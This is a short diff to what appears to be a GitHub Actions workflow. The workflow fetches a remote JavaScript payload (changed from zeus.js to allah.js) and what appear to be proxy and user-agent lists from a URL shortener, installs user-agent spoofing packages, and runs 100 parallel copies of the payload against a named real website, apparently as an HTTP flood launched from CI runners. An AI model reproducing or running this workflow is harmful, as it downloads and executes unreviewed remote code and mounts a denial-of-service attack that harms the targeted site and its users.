@@ -15,14 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/wjk60/zeus.js
+          wget https://curl.by/fje4e/allah.js
           wget https://curl.by/UYgdD/fres.txt
           wget https://curl.by/_m4jT/ua.txt
           npm install fake-useragent colors header-generator user-agents
-          chmod +x zeus.js
+          chmod +x allah.js
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node zeus.js https://hexbear.xyz/ 81 90 16
+            timeout 85 node allah.js https://hexbear.xyz/ 80 64 12
             PIDS+=($!)
           done
           
